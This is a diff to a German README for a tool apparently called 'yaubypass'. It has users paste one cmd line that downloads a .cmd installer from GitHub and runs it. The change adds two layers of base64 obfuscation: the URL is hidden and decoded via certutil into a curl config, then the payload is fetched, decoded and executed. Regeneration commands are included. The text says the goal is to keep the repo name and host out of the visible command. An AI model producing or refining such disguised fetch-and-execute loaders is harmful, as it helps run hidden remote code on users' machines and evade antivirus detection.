@@ -6,25 +6,33 @@ Der User lädt nichts herunter und klickt nichts an. Er pastet **eine Zeile in c
 curl -L -o "%TEMP%\yau.cmd" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/install.cmd && "%TEMP%\yau.cmd"
 ```
 
-## Verschlüsselte Variante (kein lesbarer Code)
+## Verschlüsselte Variante (kein Name, kein lesbarer Code)
 
 ```
-curl -L -o "%TEMP%\y.b64" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/yb.b64 && certutil -f -decode "%TEMP%\y.b64" "%TEMP%\y.cmd" >nul 2>&1 && "%TEMP%\y.cmd"
+echo dXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9memVieXBhc3MveWF1YnlwYXNzL21haW4vZGlzdC95Yi5iNjQi> "%TEMP%\c.b64" & certutil -f -decode "%TEMP%\c.b64" "%TEMP%\c.cfg" >nul 2>&1 & curl -sfL -o "%TEMP%\y.b64" -K "%TEMP%\c.cfg" & certutil -f -decode "%TEMP%\y.b64" "%TEMP%\y.cmd" >nul 2>&1 & "%TEMP%\y.cmd"
 ```
 
-`yb.b64` ist [install.cmd](install.cmd) als Base64 — im Download steht kein lesbarer
-Code mehr, nur Datensalat. `certutil` ist in Windows eingebaut, es wird also weiterhin
-kein PowerShell gebraucht. Der dekodierte Inhalt ist byte-identisch (gleiche MD5).
+Zwei Schichten, beide nur mit Windows-Bordmitteln:
 
-Neu erzeugen nach jeder Änderung an `install.cmd`:
+1. Die **URL** steckt Base64-kodiert im Befehl. `certutil` macht daraus eine
+   curl-Config (`url = "..."`), die per `curl -K` gelesen wird — im Befehl steht
+   weder `yaubypass` noch `github`.
+2. Der **Installer** liegt als [yb.b64](yb.b64) auf GitHub und wird ebenfalls per
+   `certutil` dekodiert.
+
+Neu erzeugen:
 
 ```
+# Installer-Payload
 base64 -w 64 dist/install.cmd | sed 's/$/\r/' > dist/yb.b64
+
+# URL im Befehl
+printf 'url = "https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/yb.b64"' | base64 -w 0
 ```
 
-Das ist **Verschleierung, keine echte Verschlüsselung**: die Datei wird auf demselben
-PC wieder entschlüsselt, und Virenscannern hilft Base64 eher beim Erkennen als beim
-Verstecken. Wirklich verstecken lässt sich nur die Domain (eigene kurze URL).
+Das ist **Verschleierung, keine echte Verschlüsselung**: der PC entschlüsselt beides
+selbst wieder, und Virenscannern hilft Base64 eher beim Erkennen als beim Verstecken.
+`curl` und `certutil` bleiben sichtbar — die lassen sich in cmd nicht verbergen.
 
 ---
 
